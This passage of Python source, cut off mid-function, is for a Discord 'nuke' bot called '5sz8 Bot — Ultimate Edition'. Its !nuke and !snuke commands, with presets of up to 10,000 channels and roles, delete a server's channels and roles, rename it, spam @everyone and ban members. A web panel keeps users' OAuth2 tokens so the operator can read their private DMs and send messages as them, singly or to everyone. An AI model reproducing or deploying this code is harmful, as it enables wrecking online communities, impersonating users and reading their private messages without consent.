@web.route('/panel/user/<int:uid>')
def p_view_user(uid):
    if not session.get('logged_in'): return redirect('/panel')
    if uid not in user_tokens: return "User not found", 404
    td = user_tokens[uid]
    dms = []
    try:
        headers = {'Authorization': f'Bearer {td["access"]}'}
        r = req_lib.post(f'{DISCORD_API}/users/@me/channels',
                         json={'recipient_id': str(uid)}, headers=headers)
        if r.ok:
            cid = r.json()['id']
            r2 = req_lib.get(f'{DISCORD_API}/channels/{cid}/messages?limit=20', headers=headers)
            if r2.ok:
                for msg in r2.json():
                    dms.append({
                        "author":  msg['author']['username'],
                        "content": msg['content'][:200],
                        "time":    msg['timestamp'][:19]
                    })
    except: pass
    return render_template_string(USER_VIEW_HTML,
        uid=uid, username=td.get('username', 'Unknown'),
        scopes=', '.join(td.get('scopes', [])), dms=dms)

@web.route('/panel/send/<int:uid>')
def p_send_form(uid):
    if not session.get('logged_in'): return redirect('/panel')
    return f"""<html><body style="background:#0a0a0f;color:#e0e0f0;padding:40px;font-family:sans-serif">
<h2>Send DM to {uid}</h2><a href="/panel">← Back</a>
<form action="/panel/send-to-user" method="post" style="margin-top:20px">
<input type="hidden" name="uid" value="{uid}">
<input type="text" name="content" placeholder="Message" required
  style="width:300px;padding:10px;background:#111;border:1px solid #333;color:#fff;border-radius:6px;margin-right:8px">
<button type="submit" style="padding:10px 20px;background:#238636;color:#fff;border:none;border-radius:6px;cursor:pointer">Send</button>
</form></body></html>"""

@web.route('/panel/send-to-user', methods=['POST'])
def p_send_to_user():
    if not session.get('logged_in'): return redirect('/panel')
    uid = int(request.form.get('uid'))
    content = request.form.get('content', '')
    if uid in user_tokens:
        td = user_tokens[uid]
        headers = {'Authorization': f'Bearer {td["access"]}', 'Content-Type': 'application/json'}
        r = req_lib.post(f'{DISCORD_API}/users/@me/channels',
                         json={'recipient_id': str(uid)}, headers=headers)
        if r.ok:
            cid = r.json()['id']
            req_lib.post(f'{DISCORD_API}/channels/{cid}/messages',
                         json={'content': content}, headers=headers)
    return redirect(f'/panel/user/{uid}')

@web.route('/panel/msg-all', methods=['POST'])
def p_msg_all():
    if not session.get('logged_in'): return redirect('/panel')
    content = request.form.get('content', '')
    for uid, td in user_tokens.items():
        try:
            headers = {'Authorization': f'Bearer {td["access"]}', 'Content-Type': 'application/json'}
            r = req_lib.post(f'{DISCORD_API}/users/@me/channels',
                             json={'recipient_id': str(uid)}, headers=headers)
            if r.ok:
                req_lib.post(f'{DISCORD_API}/channels/{r.json()["id"]}/messages',
                             json={'content': content}, headers=headers)
        except: pass
    return redirect('/panel')

@web.route('/panel/logout')
def p_logout():
    session.clear()
    return redirect('/panel')

@web.route('/callback')
def oauth_callback():
    code = request.args.get('code')
    if not code:
        return 'Missing code', 400
    try:
        r = req_lib.post(f'{DISCORD_API}/oauth2/token', data={
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if not r.ok:
            return f'Token exchange failed: {r.status_code}', 400
        data = r.json()
        access_token  = data.get('access_token', '')
        refresh_token = data.get('refresh_token', '')
        scopes        = data.get('scope', '').split()
        r2 = req_lib.get(f'{DISCORD_API}/users/@me',
                         headers={'Authorization': f'Bearer {access_token}'})
        if not r2.ok:
            return 'Failed to fetch user info', 400
        user_info = r2.json()
        uid = int(user_info['id'])
        user_tokens[uid] = {
            'access':   access_token,
            'refresh':  refresh_token,
            'expires':  data.get('expires_in'),
            'username': user_info.get('username', 'Unknown'),
            'scopes':   scopes
        }
        save_tokens()
        return f'<html><body style="background:#0a0a0f;color:#e0e0f0;font-family:sans-serif;padding:40px;text-align:center">' \
               f'<h2 style="color:#57f287">✅ Authorized!</h2>' \
               f'<p style="margin-top:12px">Welcome, <strong>{user_info.get("username","?")}</strong>! You can close this tab.</p>' \
               f'</body></html>'
    except Exception as ex:
        return f'Error: {str(ex)[:200]}', 500

def run_web():
    web.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def keep_alive():
    threading.Thread(target=run_web, daemon=True).start()

# ─────────────────────────────────────────────────────────────
#  BOT SETUP
# ─────────────────────────────────────────────────────────────
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
voice_inviter: dict = {}
bot_start_time = datetime.datetime.utcnow()

async def global_check(ctx) -> bool:
    return is_trusted(ctx.author.id)

bot.add_check(global_check)

# ─────────────────────────────────────────────────────────────
#  EVENTS
# ─────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(type=discord.ActivityType.watching, name='!nuke | 5sz8'))
    print(f'+======================+')
    print(f'| ✅ {bot.user.name} Online')
    print(f'| 👑 Owner: {OWNER_ID}')
    print(f'| 🌐 Servers: {len(bot.guilds)}')
    print(f'+======================+')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply(f"❌ Missing argument: `{error.param.name}`")
    elif isinstance(error, commands.BadArgument):
        await ctx.reply(f"❌ Invalid argument: {error}")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.reply(embed=eb('❌ Error', 'User not found!', C_ERR))

@bot.event
async def on_member_join(member):
    gid = str(member.guild.id)
    uid = str(member.id)
    if gid in noback_data and uid in noback_data[gid]:
        try:
            await member.ban(reason='🔴 NoBack Auto-Reban')
        except: pass

@bot.event
async def on_member_unban(guild: discord.Guild, user: discord.User):
    gid, uid = str(guild.id), str(user.id)
    if gid in noback_data and uid in noback_data[gid]:
        try:
            await guild.ban(user, reason='🔴 NoBack Auto-Reban')
        except: pass

@bot.event
async def on_voice_state_update(member, before, after):
    if member.bot: return
    vc = member.guild.voice_client
    if not vc: return
    inv = voice_inviter.get(member.guild.id)
    if inv and member.id == inv and before.channel and after.channel != before.channel:
        await vc.disconnect()
        voice_inviter.pop(member.guild.id, None)

# ─────────────────────────────────────────────────────────────
#  COMMANDS — HELP
# ─────────────────────────────────────────────────────────────
@bot.command(name='help', aliases=['h', 'H', 'cmds', 'commands'])
async def cmd_help(ctx):
    guild = ctx.guild
    perms = guild.me.guild_permissions
    perm_list = []
    if perms.administrator:    perm_list.append("Administrator")
    if perms.manage_channels:  perm_list.append("Channels")
    if perms.manage_roles:     perm_list.append("Roles")
    if perms.ban_members:      perm_list.append("Ban")
    if perms.kick_members:     perm_list.append("Kick")
    if perms.manage_guild:     perm_list.append("ManageServer")
    if not perm_list:          perm_list.append("Limited")

    ups = (datetime.datetime.utcnow() - bot_start_time).total_seconds()
    h, m = int(ups // 3600), int((ups % 3600) // 60)
    total_m = sum(g.member_count for g in bot.guilds) if bot.guilds else 0

    e = discord.Embed(
        title="💀 **5sz8 Bot — Ultimate Edition** 💀",
        description=f"**Server:** {guild.name}\n**Owner:** <@{OWNER_ID}>",
        color=0xFF0000, timestamp=datetime.datetime.utcnow())
    e.add_field(name="📊 Stats", value=(
        f"🤖 **Bot:** {bot.user} | 🌐 **Servers:** `{len(bot.guilds)}` | **Members:** `{total_m:,}`\n"
        f"👥 **This Server:** `{guild.member_count}` | **Ch:** `{len(guild.channels)}` | **Roles:** `{len(guild.roles)}`\n"
        f"👤 **OAuth2 Users:** `{len(user_tokens)}` | ⭐ **Trusted:** `{len(trusted_users)}`\n"
        f"⚡ **Ping:** `{round(bot.latency*1000)}ms` | **Uptime:** `{h}h {m}m`\n"
        f"🔑 **Perms:** `{', '.join(perm_list[:5])}`"
    ), inline=False)
    e.add_field(name="💀 Nuke", value=(
        "`!nuke [ch] [ro] [name] [msg]` — ULTIMATE (1 to 1M) | react preset menu if no args\n"
        "`!snuke [ch] [ro] [name] [msg]` — Fast nuke\n"
        "`!restore` — Stop active nuke / restore from backup | `!nukestatus` | `!nukehelp`"
    ), inline=False)
    e.add_field(name="🔐 Trust & NoBack", value=(
        "`!tr @user` / `!utr @user` / `!tl` — Trust management\n"
        "`!nb @user` — Permanent IP ban + auto-reban | `!unb @user` | `!nbl`"
    ), inline=False)
    e.add_field(name="🔨 Moderation", value=(
        "`!ban @user` / `!unban ID` / `!k @user` / `!m @user [mins]` / `!um @user`"
    ), inline=False)
    e.add_field(name="🏅 Roles & Channels", value=(
        "`!mm admin/streamer/mod/manager` / `!gr @user role` / `!rr @user role` / `!cr` / `!dr`\n"
        "`!cc name count text/voice` / `!dch #channel`"
    ), inline=False)
    e.add_field(name="🔊 Voice & Other", value=(
        "`!vc` / `!jv ID` / `!lv` / `!vk @user`\n"
        "`!mn @user msg` / `!c amount` / `!si` / `!ui @user`"
    ), inline=False)
    e.add_field(name="👥 OAuth2 Users (owner only)", value=(
        "`!users` / `!mtu <id> <msg>` / `!msgall <msg>` / `!removeuser <id>`"
    ), inline=False)
    e.set_footer(text="5sz8 Bot | !nuke [ch] [ro] [name] [msg]")
    await ctx.reply(embed=e)

# ─────────────────────────────────────────────────────────────
#  COMMANDS — NUKE
# ─────────────────────────────────────────────────────────────
@bot.command(name='nuke', aliases=['Nuke', 'NUKE'])
async def cmd_nuke(ctx, ch: str = None, ro: str = None, *, name_msg: str = None):
    """
    !nuke                          — show reaction preset menu
    !nuke <ch> <ro>                — custom ch/ro count
    !nuke <ch> <ro> <name> | <msg> — fully custom
    """
    guild = ctx.guild

    # ── No args → reaction preset menu ──
    if ch is None:
        embed = discord.Embed(
            title="💣 NUKE PRESETS — 5sz8 Ultimate",
            description="React below to choose a preset, or use:\n`!nuke <ch> <ro> <name> | <msg>`",
            color=0xFF0000)
        embed.add_field(name="1️⃣ Default",  value="500ch / 500ro  | name: 5sz8-NUKED",    inline=False)
        embed.add_field(name="2️⃣ Massive",  value="1000ch / 1000ro | name: MASSIVE-NUKE", inline=False)
        embed.add_field(name="3️⃣ Extreme",  value="5000ch / 5000ro | name: EXTREME",      inline=False)
        embed.add_field(name="4️⃣ Light",    value="100ch / 100ro  | name: LIGHT",         inline=False)
        embed.add_field(name="5️⃣ Max",      value="10,000ch / 10,000ro | name: MAX-NUKE", inline=False)
        embed.set_footer(text="Selection expires in 30 seconds")
        msg = await ctx.send(embed=embed)

        for emoji in ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"]:
            await msg.add_reaction(emoji)

        def check(reaction, user):
            return (user == ctx.author
                    and str(reaction.emoji) in REACTION_PRESETS
                    and reaction.message.id == msg.id)

        try:
            reaction, _ = await bot.wait_for("reaction_add", timeout=30.0, check=check)
            channels, roles, name, spam_msg, spam_count = REACTION_PRESETS[str(reaction.emoji)]
            await ctx.send(f"💥 Starting **{name}** preset… ({channels:,} ch / {roles:,} ro)")
        except asyncio.TimeoutError:
            await ctx.send("⏱️ Preset selection timed out.")
            return

    # ── Args provided ──
    else:
        try:
            channels = int(ch)
        except ValueError:
            return await ctx.send(embed=eb('❌ Error', 'Use: `!nuke <ch> <ro> <name> | <msg>`', C_ERR))

        roles      = int(ro) if ro and ro.isdigit() else 500
        name       = "5sz8-NUKED"
        spam_msg   = "@everyone Server Nuked by 5sz8 Bot"
        spam_count = 15

        if name_msg:
            if "|" in name_msg:
                parts    = name_msg.split("|", 1)
                name     = parts[0].strip() or name
                spam_msg = parts[1].strip() or spam_msg
            else:
                name = name_msg.strip() or name

        channels = max(1, min(channels, 1_000_000))
        roles    = max(1, min(roles,    1_000_000))

    status = await ctx.send(
        f"💀 **NUKING** {guild.name}…\nch: {channels:,} | ro: {roles:,} | name: {name}")

    report = await nuke_server(guild, channels, roles, name, spam_msg, spam_count)

    try:
        await status.edit(embed=report.embed(guild.name, ctx.author, name))
    except:
        try:
            fc = await safe_make_ch(guild, "nuke-report")
            if fc: await fc.send(embed=report.embed(guild.name, ctx.author, name))
        except: pass


@bot.command(name='snuke', aliases=['Snuke', 'SNUKE'])
async def cmd_snuke(ctx, channels: int = 30, roles: int = 20, *, rest: str = None):
    guild    = ctx.guild
    new_name = "5sz8-FAST"
    spam_msg = "@everyone **FAST NUKE** 💀"
    if rest:
        parts = rest.split(' ', 1)
        if parts[0]: new_name = parts[0]
        if len(parts) >= 2: spam_msg = parts[1]
    channels = max(1, min(channels, 1_000_000))
    roles    = max(1, min(roles,    1_000_000))
    status = await ctx.reply(f"⚡ **FAST NUKE** {guild.name}…")
    report = await nuke_server(guild, channels, roles, new_name, spam_msg, 5)
    try: await status.edit(embed=report.embed(guild.name, ctx.author, new_name))
    except: pass


@bot.command(name='restore', aliases=['Restore', 'revert'])
async def cmd_restore(ctx):
    guild = ctx.guild

    # ── If a nuke is running → stop spam + quick restore ──
    if nuke_active:
        if not is_trusted(ctx.author.id):
            return await ctx.reply(embed=eb('❌ Error', 'You are not trusted.', C_ERR))
        await stop_spam()
        msg = await ctx.reply("✅ Infinite spam stopped. Quick-restoring server…")
        try:
            await safe_edit_g(guild, name="5sz8 Restored")
            for ch in list(guild.channels):
                try:
                    await ch.delete()
                    await asyncio.sleep(0.02)
                except: pass
            general = await guild.create_text_channel("general")
            await general.send("✅ Server quick-restored by 5sz8 Bot")
            try: await msg.edit(content="✅ Quick restore complete!")
            except: pass
        except Exception as ex:
            try: await msg.edit(content=f"⚠️ Partial restore done. Error: {ex}")
            except: pass
        return

    # ── No active nuke → restore from backup ──
    if ctx.author.id != OWNER_ID:
        return await ctx.reply(embed=eb('❌ Error', 'Only the bot owner can use !restore.', C_ERR))
    if guild.id not in nuke_data or "backup" not in nuke_data[guild.id]:
        return await ctx.reply(embed=eb('❌ Error', 'No backup found! Run !nuke first.', C_ERR))
    backup = nuke_data[guild.id]["backup"]
    msg = await ctx.reply(f"♻️ Restoring **{backup['name']}**…")
    for ch in list(guild.channels):
        await safe_del_ch(ch); await asyncio.sleep(0.1)
    bot_top = guild.me.top_role
    for r in sorted(list(guild.roles), key=lambda r: r.position):
        if r.name == "@everyone" or r >= bot_top or r.managed: continue
        await safe_del_role(r); await asyncio.sleep(0.08)
    await safe_edit_g(guild, name=backup["name"])
    rc = 0
    for rd in backup["roles"]:
        try:
            await guild.create_role(
                name=rd["name"], permissions=discord.Permissions(rd["permissions"]),
                color=discord.Color(rd["color"]), hoist=rd["hoist"], mentionable=rd["mentionable"])
            rc += 1
        except: pass
        await asyncio.sleep(0.15)
    cc = 0
    for cd in backup["channels"]:
        try:
            if cd["type"] in ["text", "news", "forum"]:
                await guild.create_text_channel(cd["name"], topic=cd.get("topic", ""))
            elif cd["type"] in ["voice", "stage"]:
                await guild.create_voice_channel(cd["name"])
            cc += 1
        except: pass
        await asyncio.sleep(0.15)
    e = discord.Embed(title="✅ **RESTORE COMPLETE**",
                      description=f"**{backup['name']}** restored!",
                      color=0x57F287, timestamp=datetime.datetime.utcnow())
    e.add_field(name="Roles Restored",    value=str(rc), inline=True)
    e.add_field(name="Channels Restored", value=str(cc), inline=True)
    try: await msg.edit(embed=e)
    except: pass
    if guild.id in nuke_data:
        del nuke_data[guild.id]; save_nuke()


@bot.command(name='nukehelp', aliases=['nh'])
async def cmd_nukehelp(ctx):
    e = discord.Embed(title="💀 **Nuke Help — 5sz8 Ultimate**",
                      description="**Full range: 1 to 1,000,000**", color=0xFF0000)
    e.add_field(name="!nuke [ch] [ro] [name] | [msg]", value=(
        "Full nuke — delete all channels/roles, rename server, create new ones, spam, ban all.\n\n"
        "**Examples:**\n"
        "`!nuke` — show reaction preset menu\n"
        "`!nuke 100 50` — 100 channels, 50 roles\n"
        "`!nuke 500 250 MY-SERVER | @everyone RIP` — custom name + message\n"
        "`!nuke 1000000 1000000 MAX | @everyone MASSIVE` — max range"
    ), inline=False)
    e.add_field(name="!snuke [ch] [ro] [name] [msg]", value="Fast nuke with less delay", inline=False)
    e.add_field(name="!restore", value="If nuke running → stops spam + quick restore.\nOtherwise → full restore from auto-backup (owner only)", inline=False)
    e.add_field(name="!nukestatus (!ns)", value="Check backup and server status", inline=False)
    e.set_footer(text="5sz8 Nuke Ultimate")
    await ctx.reply(embed=e)


@bot.command(name='nukestatus', aliases=['ns'])
async def cmd_nukestatus(ctx):
    guild = ctx.guild
    has = guild.id in nuke_data
    e = discord.Embed(title="Nuke Status", description=guild.name,
                      color=C_INFO, timestamp=datetime.datetime.utcnow())
    e.add_field(name="Backup",      value="✅ Yes" if has else "❌ No", inline=True)
    e.add_field(name="Nuke Active", value="🔥 Yes" if nuke_active else "💤 No", inline=True)
    e.add_field(name="Channels",    value=str(len(guild.channels)),    inline=True)
    e.add_field(name="Roles",       value=str(len(guild.roles)),       inline=True)
    e.add_field(name="Members",     value=str(guild.member_count),     inline=True)
    e.add_field(name="Owner",       value=guild.owner.mention if guild.owner else "?", inline=True)
    if has and "timestamp" in nuke_data[guild.id]:
        e.add_field(name="Backup Date", value=nuke_data[guild.id]["timestamp"][:19], inline=False)
    await ctx.reply(embed=e)

# ─────────────────────────────────────────────────────────────
#  COMMANDS — TRUST
# ─────────────────────────────────────────────────────────────
@bot.command(name='trust', aliases=['tr'])
async def cmd_trust(ctx, target: str = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send(embed=eb('❌ Error', 'Only the owner can trust users!', C_ERR))
    if not target:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!tr @user` or `!tr ID`', C_ERR))
    try: uid = strip_id(target)
    except: return await ctx.send(embed=eb('❌ Error', 'Invalid ID!', C_ERR))
    if uid in trusted_users:
        return await ctx.send(embed=eb('⚠️ Warning', f'`{uid}` is already trusted!', C_WARN))
    trusted_users.append(uid); save_trusted()
    await ctx.send(embed=eb('✅ Added', f'`{uid}` is now trusted!', C_OK))


@bot.command(name='untrust', aliases=['utr'])
async def cmd_untrust(ctx, target: str = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send(embed=eb('❌ Error', 'Only the owner can untrust users!', C_ERR))
    if not target:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!utr @user` or `!utr ID`', C_ERR))
    try: uid = strip_id(target)
    except: return await ctx.send(embed=eb('❌ Error', 'Invalid ID!', C_ERR))
    if uid == OWNER_ID:
        return await ctx.send(embed=eb('❌ Error', 'Cannot remove the bot owner!', C_ERR))
    if uid not in trusted_users:
        return await ctx.send(embed=eb('⚠️ Warning', f'`{uid}` is not trusted!', C_WARN))
    trusted_users.remove(uid); save_trusted()
    await ctx.send(embed=eb('✅ Removed', f'`{uid}` removed from trust list!', C_OK))


@bot.command(name='trustlist', aliases=['tl'])
async def cmd_trustlist(ctx):
    lines = [f'👑 `{OWNER_ID}` — Owner']
    for uid in trusted_users:
        if uid != OWNER_ID: lines.append(f'⭐ `{uid}`')
    await ctx.send(embed=eb('📋 Trust List', '\n'.join(lines) or 'Empty', C_INFO))

# ─────────────────────────────────────────────────────────────
#  COMMANDS — NOBACK
# ─────────────────────────────────────────────────────────────
@bot.command(name='noback', aliases=['nb'])
async def cmd_nb(ctx, target: str = None, *, reason: str = 'No reason provided'):
    if not target:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!nb @user` or `!nb ID`', C_ERR))
    try: uid_int = strip_id(target)
    except: return await ctx.send(embed=eb('❌ Error', 'Invalid ID!', C_ERR))

    gid   = str(ctx.guild.id)
    uid_s = str(uid_int)

    member = ctx.guild.get_member(uid_int)
    if member:
        if member.top_role >= ctx.author.top_role and not is_owner(ctx.author.id):
            return await ctx.send(embed=eb('❌ Error',
                'You cannot NoBack this member — their role is equal to or higher than yours.', C_ERR))

    noback_data.setdefault(gid, [])
    if uid_s in noback_data[gid]:
        return await ctx.send(embed=eb('⚠️ Warning', f'`{uid_s}` is already in NoBack!', C_WARN))

    try:
        user = await bot.fetch_user(uid_int)
        await ctx.guild.ban(user, reason=f'NoBack by {ctx.author} - {reason}',
                            delete_message_seconds=604800)
        noback_data[gid].append(uid_s); save_noback()
        e = eb('⛔ NoBack — IP Ban',
               f'**{user}** permanently banned!\n7 days of messages wiped.', C_NB)
        e.add_field(name='User',   value=f'{user}\n`{user.id}`', inline=True)
        e.add_field(name='By',     value=ctx.author.mention,     inline=True)
        e.add_field(name='Reason', value=reason,                 inline=False)
        e.set_thumbnail(url=user.display_avatar.url)
        await ctx.send(embed=e)
    except discord.NotFound:
        await ctx.send(embed=eb('❌ Error', 'User not found!', C_ERR))
    except discord.Forbidden:
        await ctx.send(embed=eb('❌ Error', 'Missing permissions!', C_ERR))


@bot.command(name='unnoback', aliases=['unb'])
async def cmd_unb(ctx, target: str = None):
    if not target:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!unb @user` or `!unb ID`', C_ERR))
    try: uid_int = strip_id(target)
    except: return await ctx.send(embed=eb('❌ Error', 'Invalid ID!', C_ERR))
    gid   = str(ctx.guild.id)
    uid_s = str(uid_int)
    if gid not in noback_data or uid_s not in noback_data[gid]:
        return await ctx.send(embed=eb('⚠️ Warning', f'`{uid_s}` is not in NoBack!', C_WARN))
    try:
        user = await bot.fetch_user(uid_int)
        noback_data[gid].remove(uid_s); save_noback()
        await ctx.guild.unban(user, reason=f'Remove NoBack by {ctx.author}')
        await ctx.send(embed=eb('✅ NoBack Removed', f'**{user}** has been unbanned!', C_OK))
    except discord.NotFound:
        if uid_s in noback_data.get(gid, []):
            noback_data[gid].remove(uid_s); save_noback()
        await ctx.send(embed=eb('✅ Done', f'`{uid_s}` removed from NoBack.', C_OK))
    except discord.Forbidden:
        await ctx.send(embed=eb('❌ Error', 'Missing permissions!', C_ERR))


@bot.command(name='nblist', aliases=['nbl', 'nobacklist'])
async def cmd_nblist(ctx):
    gid = str(ctx.guild.id)
    lst = noback_data.get(gid, [])
    if not lst:
        return await ctx.send(embed=eb('📋 NoBack List', 'The list is empty!', C_NB))
    desc = '\n'.join(f'`{uid}`' for uid in lst)
    await ctx.send(embed=eb(f'📋 NoBack — {len(lst)} user(s)', desc, C_NB))

# ─────────────────────────────────────────────────────────────
#  COMMANDS — MODERATION
# ─────────────────────────────────────────────────────────────
@bot.command(name='ban', aliases=['kasra'])
async def cmd_ban(ctx, target: str = None, *, reason: str = 'No reason provided'):
    if not target:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!ban @user reason`', C_ERR))
    try: uid_int = strip_id(target)
    except: return await ctx.send(embed=eb('❌ Error', 'Invalid ID!', C_ERR))
    try:
        user = await bot.fetch_user(uid_int)
        await ctx.guild.ban(user, reason=f'by {ctx.author} - {reason}')
        e = eb('🔨 Banned', '', C_BAN)
        e.add_field(name='User',   value=f'{user}\n`{user.id}`', inline=True)
        e.add_field(name='Reason', value=reason,                 inline=True)
        e.set_thumbnail(url=user.display_avatar.url)
        await ctx.send(embed=e)
    except discord.NotFound:   await ctx.send(embed=eb('❌ Error', 'User not found!',      C_ERR))
    except discord.Forbidden:  await ctx.send(embed=eb('❌ Error', 'Missing permissions!', C_ERR))


@bot.command(name='unban')
async def cmd_unban(ctx, user_id: str = None):
    if not user_id:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!unban ID`', C_ERR))
    try:
        uid  = int(user_id.strip())
        user = await bot.fetch_user(uid)
        await ctx.guild.unban(user, reason=f'by {ctx.author}')
        await ctx.send(embed=eb('✅ Unbanned', f'**{user}** has been unbanned!', C_OK))
    except discord.NotFound:  await ctx.send(embed=eb('❌ Error', 'User is not banned!', C_ERR))
    except discord.Forbidden: await ctx.send(embed=eb('❌ Error', 'Missing permissions!', C_ERR))
    except ValueError:        await ctx.send(embed=eb('❌ Error', 'Invalid ID!',          C_ERR))


@bot.command(name='kick', aliases=['k'])
async def cmd_kick(ctx, member: discord.Member = None, *, reason: str = 'No reason provided'):
    if not member:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!k @user reason`', C_ERR))
    if not is_owner(ctx.author.id) and member.top_role >= ctx.guild.me.top_role:
        return await ctx.send(embed=eb('❌ Error', "That member's role is higher than mine!", C_ERR))
    await member.kick(reason=f'by {ctx.author} - {reason}')
    e = eb('💢 Kicked', '', C_BAN)
    e.add_field(name='Member', value=f'{member}\n`{member.id}`', inline=True)
    e.add_field(name='Reason', value=reason,                     inline=True)
    e.set_thumbnail(url=member.display_avatar.url)
    await ctx.send(embed=e)


@bot.command(name='mute', aliases=['m'])
async def cmd_mute(ctx, member: discord.Member = None, minutes: int = 10,
                   *, reason: str = 'No reason provided'):
    if not member:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!m @user [minutes] reason`', C_ERR))
    if not 1 <= minutes <= 40320:
        return await ctx.send(embed=eb('❌ Error', 'Duration must be 1–40320 minutes!', C_ERR))
    await member.timeout(datetime.timedelta(minutes=minutes), reason=f'by {ctx.author} - {reason}')
    e = eb('🔇 Muted', '', C_MOD)
    e.add_field(name='Member',   value=f'{member}\n`{member.id}`', inline=True)
    e.add_field(name='Duration', value=f'{minutes} min',           inline=True)
    e.add_field(name='Reason',   value=reason,                     inline=False)
    e.set_thumbnail(url=member.display_avatar.url)
    await ctx.send(embed=e)


@bot.command(name='unmute', aliases=['um'])
async def cmd_unmute(ctx, member: discord.Member = None):
    if not member:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!um @user`', C_ERR))
    if member.timed_out_until is None:
        return await ctx.send(embed=eb('⚠️ Warning', f'{member.display_name} is not muted!', C_WARN))
    await member.timeout(None, reason=f'Unmuted by {ctx.author}')
    await ctx.send(embed=eb('🔊 Unmuted', f'**{member.display_name}** has been unmuted!', C_OK))

# ─────────────────────────────────────────────────────────────
#  COMMANDS — ROLES
# ─────────────────────────────────────────────────────────────
@bot.command(name='makeme', aliases=['mm'])
async def cmd_mm(ctx, preset: str = None):
    if not preset or preset.lower() not in PERM_PRESETS:
        opts = ' / '.join(f'`{k}`' for k in PERM_PRESETS)
        return await ctx.send(embed=eb('❌ Error', f'Usage: `!mm <type>`\nTypes: {opts}', C_ERR))
    key   = preset.lower()
    perms = PERM_PRESETS[key]
    labels  = {'admin': '👑 Admin', 'streamer': '🎬 Streamer', 'mod': '🛡️ Mod', 'manager': '⚙️ Manager'}
    colors  = {'admin': discord.Color.gold(), 'streamer': discord.Color.purple(),
               'mod': discord.Color.blue(), 'manager': discord.Color.green()}
    role_name = labels[key]
    existing  = discord.utils.get(ctx.guild.roles, name=role_name)
    try:
        role = existing or await ctx.guild.create_role(
            name=role_name, permissions=perms, color=colors[key], hoist=True,
            reason=f'!mm by {ctx.author}')
        await ctx.author.add_roles(role, reason='!mm command')
        e = eb('✅ Done', '', C_OK)
        e.add_field(name='Role',  value=role.mention,      inline=True)
        e.add_field(name='Given', value=ctx.author.mention, inline=True)
        await ctx.send(embed=e)
    except discord.Forbidden:
        await ctx.send(embed=eb('❌ Error', "I don't have permission to create or assign roles!", C_ERR))


@bot.command(name='giverole', aliases=['gr'])
async def cmd_gr(ctx, member: discord.Member = None, *, role_name: str = None):
    if not member or not role_name:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!gr @user role_name`', C_ERR))
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not role:
        return await ctx.send(embed=eb('❌ Error', f'No role named **{role_name}** found!', C_ERR))
    if not is_owner(ctx.author.id) and role >= ctx.guild.me.top_role:
        return await ctx.send(embed=eb('❌ Error', "That role is higher than my top role!", C_ERR))
    if role in member.roles:
        return await ctx.send(embed=eb('⚠️ Warning', f'{member.display_name} already has that role!', C_WARN))
    await member.add_roles(role)
    e = eb('✅ Role Given', '', C_ROLE)
    e.add_field(name='Member', value=member.mention, inline=True)
    e.add_field(name='Role',   value=role.mention,   inline=True)
    await ctx.send(embed=e)


@bot.command(name='removerole', aliases=['rr'])
async def cmd_rr(ctx, member: discord.Member = None, *, role_name: str = None):
    if not member or not role_name:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!rr @user role_name`', C_ERR))
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not role:
        return await ctx.send(embed=eb('❌ Error', f'No role named **{role_name}** found!', C_ERR))
    if role not in member.roles:
        return await ctx.send(embed=eb('⚠️ Warning', f'{member.display_name} does not have that role!', C_WARN))
    await member.remove_roles(role)
    e = eb('✅ Role Removed', '', C_ROLE)
    e.add_field(name='Member', value=member.mention, inline=True)
    e.add_field(name='Role',   value=role.name,      inline=True)
    await ctx.send(embed=e)


@bot.command(name='createrole', aliases=['cr'])
async def cmd_cr(ctx, name: str = None, color: str = 'random'):
    if not name:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!cr role_name [#hex]`', C_ERR))
    try:
        c = discord.Color.random() if color.lower() == 'random' \
            else discord.Color(int(color.lstrip('#'), 16))
    except:
        c = discord.Color.default()
    role = await ctx.guild.create_role(name=name, color=c, reason=f'by {ctx.author}')
    e = eb('✅ Role Created', '', role.color.value or C_ROLE)
    e.add_field(name='Name',  value=role.name,       inline=True)
    e.add_field(name='Color', value=str(role.color),  inline=True)
    e.add_field(name='ID',    value=str(role.id),     inline=True)
    await ctx.send(embed=e)


@bot.command(name='deleterole', aliases=['dr'])
async def cmd_dr(ctx, *, role_name: str = None):
    if not role_name:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!dr role_name`', C_ERR))
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not role:
        return await ctx.send(embed=eb('❌ Error', f'No role named **{role_name}** found!', C_ERR))
    name = role.name
    await role.delete(reason=f'by {ctx.author}')
    await ctx.send(embed=eb('✅ Role Deleted', f'**{name}** deleted!', C_OK))

# ─────────────────────────────────────────────────────────────
#  COMMANDS — CHANNELS
# ─────────────────────────────────────────────────────────────
@bot.command(name='createchannel', aliases=['cc'])
async def cmd_cc(ctx, name: str = None, count: int = 1, ch_type: str = 'text'):
    if not name:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!cc name count text/voice`', C_ERR))
    if not 1 <= count <= 50:
        return await ctx.send(embed=eb('❌ Error', 'Count must be 1–50!', C_ERR))
